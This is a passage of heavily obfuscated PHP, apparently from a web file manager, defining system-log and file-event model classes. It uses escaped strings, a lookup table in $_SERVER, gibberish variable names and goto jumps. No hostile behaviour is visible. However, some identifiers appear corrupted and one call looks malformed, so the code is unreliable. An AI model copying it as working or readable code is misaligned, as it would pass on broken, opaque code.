"\155\157\x64\151\x66\x79\x54\151\155\x65", $˜’¢´£… = true) { return parent::listData($„ëë¨Æù, $öñÀ´µ’, $˜’¢´£…); } public function remove($®˜Çñâ”) { $­ØãĞÇº = $this->findByName($®˜Çñâ”); if (!$­ØãĞÇº) { return !1; } return parent::remove($­ØãĞÇº[$_SERVER[±³—úê][486]]); } public function add($ÈÎ¤ÃÔÇ) { if ($this->findByName($ÈÎ¤ÃÔÇ[$_SERVER[±³—úê][32]])) { return !1; } return parent::insert($ÈÎ¤ÃÔÇ); } public function update($ëá…Ô¦ã, $¹Æ¹ˆ×) { $Œšåß”• =& $_SERVER[±³—úê]; $õ™Ï¥¨» = $this->findByName($ëá…Ô¦ã); $À š”­¯ = $this->findByName($¹Æ¹ˆ×[$Œšåß”•[32]]); if (!$õ™Ï¥¨» || $À š”­¯ && $À š”­¯[$Œšåß”•[486]] != $õ™Ï¥¨»[$Œšåß”•[486]]) { return !1; } return parent::update($õ™Ï¥¨»[$Œšåß”•[486]], $¹Æ¹ˆ×); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\x73\164\145\x6d\137\154\157\147"; protected $dataAuto = array(array("\143\162\145\141\164\145\x54\x69\x6d\145", "\x74\151\155\x65", "\151\x6e\x73\145\x72\164", "\x66\x75\156\143\x74\151\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $¼Ø÷Â—‡ =& $_SERVER[±³—úê]; return array($¼Ø÷Â—‡[2344] => LNG($¼Ø÷Â—‡[2345]), $¼Ø÷Â—‡[2346] => LNG($¼Ø÷Â—‡[2347]), $¼Ø÷Â—‡[1917] => LNG($¼Ø÷Â—‡[2348]), $¼Ø÷Â—‡[2349] => LNG($¼Ø÷Â—‡[2350]), $¼Ø÷Â—‡[2351] => LNG($¼Ø÷Â—‡[2352]), $¼Ø÷Â—‡[2353] => LNG($¼Ø÷Â—‡[2354]), $¼Ø÷Â—‡[2355] => LNG($¼Ø÷Â—‡[2356]), $¼Ø÷Â—‡[1947] => LNG($¼Ø÷Â—‡[2356]), $¼Ø÷Â—‡[1948] => LNG($¼Ø÷Â—‡[2357]), $¼Ø÷Â—‡[2358] => LNG($¼Ø÷Â—‡[2359]), $¼Ø÷Â—‡[2360] => LNG($¼Ø÷Â—‡[2361]), $¼Ø÷Â—‡[2362] => LNG($¼Ø÷Â—‡[2363]), $¼Ø÷Â—‡[2364] => LNG($¼Ø÷Â—‡[2365]), $¼Ø÷Â—‡[1945] => LNG($¼Ø÷Â—‡[2366]), $¼Ø÷Â—‡[2367] => LNG($¼Ø÷Â—‡[2368]), $¼Ø÷Â—‡[1952] => LNG($¼Ø÷Â—‡[2369]), $¼Ø÷Â—‡[2370] => LNG($¼Ø÷Â—‡[2371]), $¼Ø÷Â—‡[2372] => LNG($¼Ø÷Â—‡[2373]), $¼Ø÷Â—‡[2374] => LNG($¼Ø÷Â—‡[2375]), $¼Ø÷Â—‡[2376] => LNG($¼Ø÷Â—‡[2377]), $¼Ø÷Â—‡[1955] => LNG($¼Ø÷Â—‡[2378]), $¼Ø÷Â—‡[1956] => LNG($¼Ø÷Â—‡[2379]), $¼Ø÷Â—‡[2380] => LNG($¼Ø÷Â—‡[2381]), $¼Ø÷Â—‡[2382] => LNG($¼Ø÷Â—‡[2383]), $¼Ø÷Â—‡[2384] => LNG($¼Ø÷Â—‡[2385]), $¼Ø÷Â—‡[1950] => LNG($¼Ø÷Â—‡[2386]), $¼Ø÷Â—‡[2387] => LNG($¼Ø÷Â—‡[2388]), $¼Ø÷Â—‡[1949] => LNG($¼Ø÷Â—‡[2389]), $¼Ø÷Â—‡[2390] => LNG($¼Ø÷Â—‡[2391]), $¼Ø÷Â—‡[2392] => LNG($¼Ø÷Â—‡[2393]), $¼Ø÷Â—‡[2394] => LNG($¼Ø÷Â—‡[2393]), $¼Ø÷Â—‡[2395] => LNG($¼Ø÷Â—‡[2396]), $¼Ø÷Â—‡[2397] => LNG($¼Ø÷Â—‡[2397]), $¼Ø÷Â—‡[2398] => LNG($¼Ø÷Â—‡[1921]), $¼Ø÷Â—‡[2399] => LNG($¼Ø÷Â—‡[2400]), $¼Ø÷Â—‡[2401] => LNG($¼Ø÷Â—‡[2402]), $¼Ø÷Â—‡[2403] => LNG($¼Ø÷Â—‡[2404]), $¼Ø÷Â—‡[2405] => LNG($¼Ø÷Â—‡[2406]), $¼Ø÷Â—‡[2407] => LNG($¼Ø÷Â—‡[2408]), $¼Ø÷Â—‡[2409] => LNG($¼Ø÷Â—‡[2409]), $¼Ø÷Â—‡[2410] => LNG($¼Ø÷Â—‡[2411]), $¼Ø÷Â—‡[2412] => LNG($¼Ø÷Â—‡[2413]), $¼Ø÷Â—‡[2414] => LNG($¼Ø÷Â—‡[2415]), $¼Ø÷Â—‡[2416] => LNG($¼Ø÷Â—‡[2417]), $¼Ø÷Â—‡[2418] => LNG($¼Ø÷Â—‡[2419]), $¼Ø÷Â—‡[2420] => LNG($¼Ø÷Â—‡[2421]), $¼Ø÷Â—‡[212] => LNG($¼Ø÷Â—‡[212]), $¼Ø÷Â—‡[213] => LNG($¼Ø÷Â—‡[2422]), $¼Ø÷Â—‡[2423] => LNG($¼Ø÷Â—‡[2423])); } private function typeFile() { $ŠÁÂ…² =& $_SERVER[±³—úê]; $ˆĞÕœÒÇ = array($ŠÁÂ…²[1952] => array($ŠÁÂ…²[1953]), $ŠÁÂ…²[2362] => array($ŠÁÂ…²[2424]), $ŠÁÂ…²[2364] => array($ŠÁÂ…²[2425]), $ŠÁÂ…²[1945] => array($ŠÁÂ…²[1946], $ŠÁÂ…²[2426]), $ŠÁÂ…²[2372] => array(), $ŠÁÂ…²[2374] => array(), $ŠÁÂ…²[2376] => array(), $ŠÁÂ…²[1955] => array($ŠÁÂ…²[1957]), $ŠÁÂ…²[1956] => array($ŠÁÂ…²[1957]), $ŠÁÂ…²[2380] => array($ŠÁÂ…²[2427]), $ŠÁÂ…²[2382] => array($ŠÁÂ…²[2427]), $ŠÁÂ…²[2384] => array($ŠÁÂ…²[2428]), $ŠÁÂ…²[2370] => array($ŠÁÂ…²[2429]), $ŠÁÂ…²[1950] => array($ŠÁÂ…²[2430]), $ŠÁÂ…²[2387] => array($ŠÁÂ…²[2431]), $ŠÁÂ…²[1949] => array($ŠÁÂ…²[1951])); return $ˆĞÕœÒÇ; } private function typeAll() { $¯³ááË =& $_SERVER[±³—úê]; $á§Ç¬§Ü = $this->typeList; $±¸«†¥’ = array_filter($this->typeFile()); foreach ($±¸«†¥’ as $À²Şç™ø => $ëòŠéÇ—) { $á§Ç¬§Ü[$ëòŠéÇ—[0]] = $á§Ç¬§Ü[$À²Şç™ø]; } $á§Ç¬§Ü[$¯³ááË[1957]] = LNG($¯³ááË[2432]); $á§Ç¬§Ü[$¯³ááË[2427]] = LNG($¯³ááË[2433]); return $á§Ç¬§Ü; } public function addLog($ÁéŠîÎ, $²öÆÙõ£ = array()) { $×ãĞ‹» =& $_SERVER[±³—úê]; if (!isset($this->typeList[$ÁéŠîÎ])) { return; } $ï»Ú°­æ = Session::get($×ãĞ‹»[2116]); if (!$ï»Ú°­æ) { $ï»Ú°­æ = _get($²öÆÙõ£, $×ãĞ‹»[1775], 0); } if ($ÁéŠîÎ == $×ãĞ‹»[2399] && is_array($²öÆÙõ£[$×ãĞ‹»[2434]]) && !$²öÆÙõ£[$×ãĞ‹»[2434]]) { return; } $Ê×Ï¹øÑ = get_client_ip(); if (!$²öÆÙõ£ || strlen(json_encode($²öÆÙõ£)) >= 1024 * 64) { if ($²öÆÙõ£ && is_array($²öÆÙõ£)) { $²öÆÙõ£ = array_intersect_key($²öÆÙõ£, array_flip($×ãĞ‹»[486], $×ãĞ‹»[32])); $²öÆÙõ£[$×ãĞ‹»[2435]] = $Ê×Ï¹øÑ; } else { $²öÆÙõ£ = array($×ãĞ‹»[2435] => $Ê×Ï¹øÑ); } } else { if (is_array($²öÆÙõ£)) { $²öÆÙõ£[$×ãĞ‹»[2435]] = $Ê×Ï¹øÑ; } else { $²öÆÙõ£ = array($×ãĞ‹»[1289] => $²öÆÙõ£, $×ãĞ‹»[2435] => $Ê×Ï¹øÑ); } } $²öÆÙõ£ = array($×ãĞ‹»[1765] => Session::sign(), $×ãĞ‹»[1766] => intval($ï»Ú°­æ), $×ãĞ‹»[33] => $ÁéŠîÎ, $×ãĞ‹»[1768] => json_encode($²öÆÙõ£)); return parent::add($²öÆÙõ£); } public function remove($çºŠ÷Ì‰) { $this->where(array($_SERVER[±³—úê][504] => $çºŠ÷Ì‰))->delete(); } private function _makeOrder($è´…Íë = '') { $Ë­™ØÄƒ =& $_SERVER[±³—úê]; $¡óÀì¿ù = $Ë­™ØÄƒ[243]; $ıØ¬Íõ = array($Ë­™ØÄƒ[534] => $Ë­™ØÄƒ[535], $Ë­™ØÄƒ[536] => $Ë­™ØÄƒ[537]); $ÓŠ±æœ¶ = Input::get($Ë­™ØÄƒ[542], $Ë­™ØÄƒ[7], $Ë­™ØÄƒ[2153], array($Ë­™ØÄƒ[2070], $Ë­™ØÄƒ[536])); $ÓŠ±æœ¶ = $ıØ¬Íõ[$ÓŠ±æœ¶]; $è´…Íë = $è´…Íë . "{$¡óÀì¿ù}\x20{$ÓŠ±æœ¶}"; return $this->order($è´…Íë); } public function get($‰Ó¡µŒû = '') { $†Ò×¼ñµ =& $_SERVER[±³—úê]; if (!$‰Ó¡µŒû) { show_json(array()); } $ÌŠõ¢ñ— = array(); if ($‰Ó¡µŒû[$†Ò×¼ñµ[1775]]) { $ÌŠõ¢ñ—[$†Ò×¼ñµ[1775]] = $‰Ó¡µŒû[$†Ò×¼ñµ[1775]]; } if (isset($‰Ó¡µŒû[$†Ò×¼ñµ[840]])) { $¿Ó›É®Û = $‰Ó¡µŒû[$†Ò×¼ñµ[840]]; $ëúÇœ…ô = isset($‰Ó¡µŒû[$†Ò×¼ñµ[841]]) ? $‰Ó¡µŒû[$†Ò×¼ñµ[841]] : time(); $ÌŠõ¢ñ—[$†Ò×¼ñµ[243]] = array($†Ò×¼ñµ[419], array($¿Ó›É®Û, $ëúÇœ…ô)); } if ($‰Ó¡µŒû[$†Ò×¼ñµ[33]]) { $±ÛÖ³Î = explode($†Ò×¼ñµ[50], $‰Ó¡µŒû[$†Ò×¼ñµ[33]]); $õŒ…šé = $this->typeFile(); $İÍ•ùÀİ = array(); foreach ($±ÛÖ³Î as $Ùí¡ä®æ) { $İÍ•ùÀİ[] = $Ùí¡ä®æ; if (isset($õŒ…šé[$Ùí¡ä®æ])) { $İÍ•ùÀİ = array_merge($İÍ•ùÀİ, $õŒ…šé[$Ùí¡ä®æ]); } } $İÍ•ùÀİ = array_unique($İÍ•ùÀİ); if ($İÍ•ùÀİ) { $ÌŠõ¢ñ—[$†Ò×¼ñµ[33]] = array($†Ò×¼ñµ[7], $İÍ•ùÀİ); } } else { $ÌŠõ¢ñ—[$†Ò×¼ñµ[33]] = array($†Ò×¼ñµ[2436], $†Ò×¼ñµ[2437]); } if (!empty($‰Ó¡µŒû[$†Ò×¼ñµ[2435]])) { $ÌŠõ¢ñ—[$†Ò×¼ñµ[537]] = array($†Ò×¼ñµ[470], "\x25{$‰Ó¡µŒû[$†Ò×¼ñµ[2435]]}\x25"); } $Î£û‡áı = $this->_makeOrder()->where($ÌŠõ¢ñ—)->selectPage(); if (empty($Î£û‡áı[$†Ò×¼ñµ[456]])) { show_json(array(), !0, $Î£û‡áı[$†Ò×¼ñµ[453]]); } $Î£û‡áı[$†Ò×¼ñµ[456]] = $this->logList($Î£û‡áı[$†Ò×¼ñµ[456]]); return $Î£û‡áı; } private function ipAddress(&$åæ—¦»€) { $åÕÒÕ÷ó =& $_SERVER[±³—úê]; if (!empty($åæ—¦»€[$åÕÒÕ÷ó[2435]])) { $Óª‰®Ó = IpLocation::get($åæ—¦»€[$åÕÒÕ÷ó[2435]]); } else { $Óª‰®Ó = LNG($åÕÒÕ÷ó[2438]); } $åæ—¦»€[$åÕÒÕ÷ó[2439]] = $Óª‰®Ó; } private function descZipDownload($Ö¹û°ê‡, &$ò«ªäğ½) { $öûô¶û· =& $_SERVER[±³—úê]; if (!isset($Ö¹û°ê‡[$öûô¶û·[2440]])) { return; } $…”ãÆ… = json_decode($Ö¹û°ê‡[$öûô¶û·[2440]], !0); foreach ($…”ãÆ… as $Ğîê¾) { try { $Âµø§ˆ = IO::infoFullSimple($Ğîê¾[$öûô¶û·[87]]); } catch (Exception $—ûåÄ) { continue; } $Ö¹û°ê‡[$öûô¶û·[87]] = $Ğîê¾[$öûô¶û·[87]]; $ò«ªäğ½[] = $Ö¹û°ê‡[$öûô¶û·[193]] = $Âµø§ˆ[$öûô¶û·[193]]; $ò«ªäğ½[] = $Ö¹û°ê‡[$öûô¶û·[2209]] = $Âµø§ˆ[$öûô¶û·[192]]; break; } return $Ö¹û°ê‡; } private function getSourceList(&$‰²»¿ÜÔ) { $†ğ’ÌÀú =& $_SERVER[±³—úê]; $ã×åùÛ× = array(); foreach ($‰²»¿ÜÔ as $µ“¬İï€ => $şŞÈÒ“©) { $¥Íî¼İ… = json_decode($şŞÈÒ“©[$†ğ’ÌÀú[537]], !0); if ($şŞÈÒ“©[$†ğ’ÌÀú[33]] == $†ğ’ÌÀú[1948]) { $¥Íî¼İ… = $this->descZipDownload($¥Íî¼İ…, $ã×åùÛ×); $‰²»¿ÜÔ[$µ“¬İï€][$†ğ’ÌÀú[537]] = json_encode($¥Íî¼İ…); continue; } if (strpos($şŞÈÒ“©[$†ğ’ÌÀú[33]], $†ğ’ÌÀú[2211]) !== 0) { if (!isset($¥Íî¼İ…[$†ğ’ÌÀú[87]]) || strpos($şŞÈÒ“©[$†ğ’ÌÀú[33]], $†ğ’ÌÀú[2441]) !== 0) { continue; } try { $ËÖ‚Â§š = IO::infoFullSimple($¥Íî¼İ…[$†ğ’ÌÀú[87]]); } catch (Exception $‚¥¢˜§í) { continue; } $ã×åùÛ×[] = $¥Íî¼İ…[$†ğ’ÌÀú[193]] = $ËÖ‚Â§š[$†ğ’ÌÀú[193]]; $ã×åùÛ×[] = $¥Íî¼İ…[$†ğ’ÌÀú[2209]] = $ËÖ‚Â§š[$†ğ’ÌÀú[192]]; $‰²»¿ÜÔ[$µ“¬İï€][$†ğ’ÌÀú[537]] = json_encode($¥Íî¼İ…); continue; } $ã×åùÛ×[] = $¥Íî¼İ…[$†ğ’ÌÀú[193]]; $ã×åùÛ×[] = $¥Íî¼İ…[$†ğ’ÌÀú[2209]]; if ($¥Íî¼İ…[$†ğ’ÌÀú[33]] == $†ğ’ÌÀú[634]) { $ã×åùÛ×[] = $¥Íî¼İ…[$†ğ’ÌÀú[537]][$†ğ’ÌÀú[1243]]; $ã×åùÛ×[] = $¥Íî¼İ…[$†ğ’ÌÀú[537]][$†ğ’ÌÀú[1244]]; } if ($¥Íî¼İ…[$†ğ’ÌÀú[33]] == $†ğ’ÌÀú[2220]) { $ã×åùÛ×[] = $¥Íî¼İ…[$†ğ’ÌÀú[537]][$†ğ’ÌÀú[193]]; } } if (!$ã×åùÛ×) { return array(); } return Model($†ğ’ÌÀú[905])->sourceListInfo($ã×åùÛ×, !0); } private function logList($¹£ ”ÒÌ) { $½—÷ùÍ¿ =& $_SERVER[±³—úê]; $şÑÚàÌ˜ = array_to_keyvalue($¹£ ”ÒÌ, $½—÷ùÍ¿[12], $½—÷ùÍ¿[1775]); $øªÏß‘ò = Model($½—÷ùÍ¿[608])->userListInfo(array_unique($şÑÚàÌ˜)); $‚×¡²Üï = $this->getSourceList($¹£ ”ÒÌ); $“¡€ÅóŸ = $this->typeAll(); $Ÿ‡äóéñ = array(); $Ø›Æ­÷Á = array(); foreach ($¹£ ”ÒÌ as $š«ŒÊâ => $ş«±Üƒ) { $“±ÕíÎ” = $ş«±Üƒ[$½—÷ùÍ¿[33]]; $¶²•‡Î = isset($øªÏß‘ò[$ş«±Üƒ[$½—÷ùÍ¿[1775]]]) ? $øªÏß‘ò[$ş«±Üƒ[$½—÷ùÍ¿[1775]]] : !1; $íÔ‡ØÓî = strpos($“±ÕíÎ”, $½—÷ùÍ¿[2442]) === 0 ? LNG($½—÷ùÍ¿[2443]) : LNG($½—÷ùÍ¿[2438]); $ş«±Üƒ[$½—÷ùÍ¿[32]] = isset($¶²•‡Î[$½—÷ùÍ¿[32]]) ? $¶²•‡Î[$½—÷ùÍ¿[32]] : LNG($½—÷ùÍ¿[2438]); $ş«±Üƒ[$½—÷ùÍ¿[2270]] = isset($¶²•‡Î[$½—÷ùÍ¿[2270]]) ? $¶²•‡Î[$½—÷ùÍ¿[2270]] : $½—÷ùÍ¿[12]; $ş«±Üƒ[$½—÷ùÍ¿[1661]] = isset($“¡€ÅóŸ[$“±ÕíÎ”]) ? $“¡€ÅóŸ[$“±ÕíÎ”] : $íÔ‡ØÓî; $ş«±Üƒ[$½—÷ùÍ¿[2152]] = $¶²•‡Î; $Ù®˜Ò = json_decode($ş«±Üƒ[$½—÷ùÍ¿[537]], !0); $ş«±Üƒ[$½—÷ùÍ¿[2435]] = isset($Ù®˜Ò[$½—÷ùÍ¿[2435]]) ? $Ù®˜Ò[$½—÷ùÍ¿[2435]] : $½—÷ùÍ¿[12]; $ş«±Üƒ[$½—÷ùÍ¿[2439]] = IpLocation::get($ş«±Üƒ[$½—÷ùÍ¿[2435]]); if (strpos($“±ÕíÎ”, $½—÷ùÍ¿[2211]) === 0 || isset($Ù®˜Ò[$½—÷ùÍ¿[2209]])) { $Ù®˜Ò[$½—÷ùÍ¿[90]] = $‚×¡²Üï[$Ù®˜Ò[$½—÷ùÍ¿[193]]]; $Ù®˜Ò[$½—÷ùÍ¿[2225]] = $‚×¡²Üï[$Ù®˜Ò[$½—÷ùÍ¿[2209]]]; if ($Ù®˜Ò[$½—÷ùÍ¿[33]] == $½—÷ùÍ¿[634]) { $Ù®˜Ò[$½—÷ùÍ¿[537]][$½—÷ùÍ¿[1243]] = $‚×¡²Üï[$Ù®˜Ò[$½—÷ùÍ¿[537]][$½—÷ùÍ¿[1243]]]; $Ù®˜Ò[$½—÷ùÍ¿[537]][$½—÷ùÍ¿[1244]] = $‚×¡²Üï[$Ù®˜Ò[$½—÷ùÍ¿[537]][$½—÷ùÍ¿[1244]]]; } if ($Ù®˜Ò[$½—÷ùÍ¿[33]] == $½—÷ùÍ¿[2220]) { $Ù®˜Ò[$½—÷ùÍ¿[537]][$½—÷ùÍ¿[193]] = $‚×¡²Üï[$Ù®˜Ò[$½—÷ùÍ¿[537]][$½—÷ùÍ¿[193]]]; } if ($Ù®˜Ò[$½—÷ùÍ¿[33]] == $½—÷ùÍ¿[1943]) { $Ù®˜Ò[$½—÷ùÍ¿[2225]] = $Ù®˜Ò[$½—÷ùÍ¿[90]]; $Ù®˜Ò[$½—÷ùÍ¿[2209]] = $Ù®˜Ò[$½—÷ùÍ¿[2225]][$½—÷ùÍ¿[193]]; $Ù®˜Ò[$½—÷ùÍ¿[90]] = !1; $Ù®˜Ò[$½—÷ùÍ¿[193]] = $½—÷ùÍ¿[12]; } $Ìëñ’Å¥ = array($½—÷ùÍ¿[1943], $½—÷ùÍ¿[2207]); if (!in_array($Ù®˜Ò[$½—÷ùÍ¿[33]], $Ìëñ’Å¥)) { if ($Ù®˜Ò[$½—÷ùÍ¿[90]] && $Ù®˜Ò[$½—÷ùÍ¿[90]][$½—÷ùÍ¿[190]] == $½—÷ùÍ¿[191]) { $Ø›Æ­÷Á[] = $ş«±Üƒ[$½—÷ùÍ¿[486]]; unset($¹£ ”ÒÌ[$š«ŒÊâ]); continue; } if ($Ù®˜Ò[$½—÷ùÍ¿[2225]] && $Ù®˜Ò[$½—÷ùÍ¿[2225]][$½—÷ùÍ¿[190]] == $½—÷ùÍ¿[191]) { $Ø›Æ­÷Á[] = $ş«±Üƒ[$½—÷ùÍ¿[486]]; unset($¹£ ”ÒÌ[$š«ŒÊâ]); continue; } } } $ş«±Üƒ[$½—÷ùÍ¿[537]] = $Ù®˜Ò; unset($ş«±Üƒ[$½—÷ùÍ¿[2444]]); $Ÿ‡äóéñ[] = $ş«±Üƒ; } $this->clearSystemPathLog($Ø›Æ­÷Á); return $Ÿ‡äóéñ; } private function clearSystemPathLog($Àˆâàì‡) { $±…»¦Á‰ =& $_SERVER[±³—úê]; if (count($Àˆâàì‡) == 0) { return; } $ßññ²‘í = array($±…»¦Á‰[486] => array($±…»¦Á‰[7], array_unique($Àˆâàì‡))); $this->where($ßññ²‘í)->delete(); } public function deviceList($Êï×û‹Ÿ, $“îÈ›• = 0) { $¿ûÁ¤£‘ =& $_SERVER[±³—úê]; $Õ§‹Ù¼÷ = array($¿ûÁ¤£‘[1775] => $Êï×û‹Ÿ, $¿ûÁ¤£‘[243] => array($¿ûÁ¤£‘[1093], $“îÈ›•), $¿ûÁ¤£‘[33] => $¿ûÁ¤£‘[1917]); $Š¿ÃıÃ = array(); $ù®¥·Âù = $this->field($¿ûÁ¤£‘[2445])->where($Õ§‹Ù¼÷)->order($¿ûÁ¤£‘[2223])->limit(50)->select(); foreach ($ù®¥·Âù as $ìÉ«‘—ê => $œúßä¬) { if ($ìÉ«‘—ê > 0 && abs($œúßä¬[$¿ûÁ¤£‘[243]] - $ù®¥·Âù[$ìÉ«‘—ê - 1][$¿ûÁ¤£‘[243]]) < 5) { continue; } $±â×è—Š = json_decode($œúßä¬[$¿ûÁ¤£‘[537]], !0); $œúßä¬[$¿ûÁ¤£‘[2435]] = isset($±â×è—Š[$¿ûÁ¤£‘[2435]]) ? $±â×è—Š[$¿ûÁ¤£‘[2435]] : $¿ûÁ¤£‘[12]; unset($±â×è—Š[$¿ûÁ¤£‘[2435]]); $´¿Øá†Ã = $this->deviceType($±â×è—Š[$¿ûÁ¤£‘[2212]]); if (isset($Š¿ÃıÃ[$´¿Øá†Ã])) { continue; } $œúßä¬[$¿ûÁ¤£‘[2439]] = IpLocation::get($œúßä¬[$¿ûÁ¤£‘[2435]]); $œúßä¬[$¿ûÁ¤£‘[537]] = $±â×è—Š; $Š¿ÃıÃ[$´¿Øá†Ã] = $œúßä¬; } return array_values($Š¿ÃıÃ); } public function deviceType($Øó™æ­†) { return $Øó™æ­†; } } goto f‡œ‚çˆÑ; aºğ›‡‚Ş: class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\x6f\165\x72\x63\x65\x5f\x65\x76\145\156\x74"; protected $dataAuto = array(array("\x63\162\145\x61\164\x65\124\x69\155\145", "\164\151\155\145", "\151\x6e\x73\145\x72\164", "\146\165\156\143\x74\151\157\x6e"), array("\x64\145\x73\143", '', "\151\x6e\x73\x65\162\164\54\x75\x70\x64\141\x74\145\54\x73\x65\154\145\143\x74", "\x6a\163\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($¢ÙÏºÌ×, $Óö¿ÔˆÏ, $âìÂÂ = '') { $µâø’¸ =& $_SERVER[±³—úê]; if (!$this->eventSave) { return; } $¦¥„¢¦ = Model($µâø’¸[1423])->sourceInfo($¢ÙÏºÌ×); if (!$¦¥„¢¦) { return !1; } if ($this->isDisableEvent($¦¥„¢¦, $Óö¿ÔˆÏ)) { return; } if ($âìÂÂ && is_string($âìÂÂ)) { $âìÂÂ = array($µâø’¸[2014] => $âìÂÂ); } $õ¢œÅŠØ = defined($µâø’¸[2202]) ? USER_ID : 0; $¹ƒµ€‹ä = array($µâø’¸[502] => $¢ÙÏºÌ×, $µâø’¸[2203] => $¦¥„¢¦[$µâø’¸[192]], $µâø’¸[2204] => $¦¥„¢¦[$µâø’¸[32]], $µâø’¸[593] => !empty($¦¥„¢¦[$µâø’¸[593]]) ? $¦¥„¢¦[$µâø’¸[593]] : $µâø’¸[12], $µâø’¸[1766] => $õ¢œÅŠØ, $µâø’¸[507] => $Óö¿ÔˆÏ, $µâø’¸[1768] => $âìÂÂ); $this->addSystemLog($Óö¿ÔˆÏ, $¹ƒµ€‹ä); unset($¹ƒµ€‹ä[$µâø’¸[2204]], $¹ƒµ€‹ä[$µâø’¸[593]]); return $this->add($¹ƒµ€‹ä); } private function addSystemLog($Üİîªë, $ª‡™Ö»ï) { $¬õ®À´½ =& $_SERVER[±³—úê]; if ($Üİîªë == $¬õ®À´½[2205]) { $Üİîªë = $ª‡™Ö»ï[$¬õ®À´½[537]][$¬õ®À´½[2206]]; } else { if (in_array($Üİîªë, array($¬õ®À´½[1954], $¬õ®À´½[2207]))) { $Üİîªë = $ª‡™Ö»ï[$¬õ®À´½[537]][$¬õ®À´½[171]]; } } $ö‡½ÔŞµ = array_merge($ª‡™Ö»ï, array($¬õ®À´½[2208] => $ª‡™Ö»ï[$¬õ®À´½[193]], $¬õ®À´½[2209] => $ª‡™Ö»ï[$¬õ®À´½[2209]])); Hook::trigger($¬õ®À´½[2210], $¬õ®À´½[2211] . $Üİîªë, $ª‡™Ö»ï); Model($¬õ®À´½[1918])->addLog($¬õ®À´½[2211] . $Üİîªë, $ö‡½ÔŞµ); } private function isDisableEvent($ÁºÚüëé, $Œş•Úáš) { $š ñÛÏ’ =& $_SERVER[±³—úê]; if ($ÁºÚüëé[$š ñÛÏ’[190]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($Œş•Úáš == $š ñÛÏ’[1943]) { return !1; } return !0; } public function eventCreate($›øš³ , $Ñê¬¯Ó·) { $¯ÌÛÖµ‹ =& $_SERVER[±³—úê]; $ú³”‡Ãô = Model($¯ÌÛÖµ‹[1423])->sourceInfo($›øš³ ); $²Ö²£ = array($¯ÌÛÖµ‹[2206] => $Ñê¬¯Ó·, $¯ÌÛÖµ‹[32] => $ú³”‡Ãô[$¯ÌÛÖµ‹[32]]); return $this->addEvent($›øš³ , $¯ÌÛÖµ‹[2205], $²Ö²£); } public function eventFileEdit($²¡¦ê¶) { $£®â·¾½ =& $_SERVER[±³—úê]; $«ÇîÃ£Ã = array($£®â·¾½[2212] => $_SERVER[$£®â·¾½[2213]], $£®â·¾½[2214] => strtolower(ACTION)); if (isset($GLOBALS[$£®â·¾½[7]][$£®â·¾½[2215]])) { $«ÇîÃ£Ã[$£®â·¾½[2215]] = $£®â·¾½[91]; } return $this->addEvent($²¡¦ê¶, $£®â·¾½[1944], $«ÇîÃ£Ã); } public function eventRecycle($¸¦ÄĞ, $ŠäÁÌÍ) { return $this->addEvent($¸¦ÄĞ, $_SERVER[±³—úê][2207], $ŠäÁÌÍ); } private static $_removeLast = ''; public function eventRemove($û¼š¥Ô«) { $²çìÓù =& $_SERVER[±³—úê]; self::$_removeLast = $û¼š¥Ô«; $ß§Ó©ÙÁ = Model($²çìÓù[1423])->sourceInfo($û¼š¥Ô«); $Ø¡ñÑÕë = array_field_key($ß§Ó©ÙÁ, array($²çìÓù[193], $²çìÓù[552], $²çìÓù[516], $²çìÓù[595])); $Ô¯†şØ = array($²çìÓù[171] => $ß§Ó©ÙÁ[$²çìÓù[32]], $²çìÓù[2214] => ACTION, $²çìÓù[2216] => $Ø¡ñÑÕë); return $this->addEvent($ß§Ó©ÙÁ[$²çìÓù[192]], $²çìÓù[1943], $Ô¯†şØ); } public function eventShare($—Ïß“ñ, $ªŠÅÏ÷) { return $this->addEvent($—Ïß“ñ, $_SERVER[±³—úê][1954], $ªŠÅÏ÷); } public function eventMove($ÅÙø½òÇ, $Ä¶êÀä“, $ûéç›•´) { $şúª · =& $_SERVER[±³—úê]; if (self::$_removeLast == $ÅÙø½òÇ) { return; } $İæğì’ = Model($şúª ·[1423]); $ÔñÛ’±Ù = $İæğì’->sourceInfo($ÅÙø½òÇ); $¢šè¸ìš = $İæğì’->sourceInfo($Ä¶êÀä“); $É¡ÛÎíƒ = $İæğì’->sourceInfo($ûéç›•´); $˜íˆŸÔ½ = array($şúª ·[1243] => $Ä¶êÀä“, $şúª ·[2217] => $¢šè¸ìš[$şúª ·[32]], $şúª ·[2193] => !empty($¢šè¸ìš[$şúª ·[593]]) ? $¢šè¸ìš[$şúª ·[593]] : $şúª ·[12], $şúª ·[1244] => $ûéç›•´, $şúª ·[2218] => $É¡ÛÎíƒ[$şúª ·[32]], $şúª ·[2219] => !empty($É¡ÛÎíƒ[$şúª ·[593]]) ? $É¡ÛÎíƒ[$şúª ·[593]] : $şúª ·[12]); $this->addEvent($ÅÙø½òÇ, $şúª ·[634], $˜íˆŸÔ½); $ÔñÛ’±Ù = $İæğì’->sourceInfo($ÅÙø½òÇ); $˜íˆŸÔ½ = array($şúª ·[193] => $ÔñÛ’±Ù[$şúª ·[193]], $şúª ·[32] => $ÔñÛ’±Ù[$şúª ·[32]]); $this->addEvent($Ä¶êÀä“, $şúª ·[2220], $˜íˆŸÔ½); } public function eventCopy($‡Œ”Æé°) { $this->eventCreate($‡Œ”Æé°, $_SERVER[±³—úê][632]); } public function eventRename($¢¸ñê´’, $Ÿèæê°, $ÒğÒ˜Å) { $ÚöÜ–‹ê =& $_SERVER[±³—úê]; $¢óÜŸé§ = array($ÚöÜ–‹ê[1243] => $Ÿèæê°, $ÚöÜ–‹ê[1244] => $ÒğÒ˜Å); return $this->addEvent($¢¸ñê´’, $ÚöÜ–‹ê[1437], $¢óÜŸé§); } public function eventAddComment($´‹Ä´ì™, $¾ã¾¢€Ö) { return $this->addEvent($´‹Ä´ì™, $_SERVER[±³—úê][2221], $¾ã¾¢€Ö); } public function eventAddDesc($à»…½ı‡, $ä€´œœ…) { return $this->addEvent($à»…½ı‡, $_SERVER[±³—úê][2222], $ä€´œœ…); } public function listBySource($¡¯ì‹Ã™) { $µ—üî›é =& $_SERVER[±³—úê]; $˜íªÙÀÈ = Model($µ—üî›é[1423])->sourceInfo($¡¯ì‹Ã™); 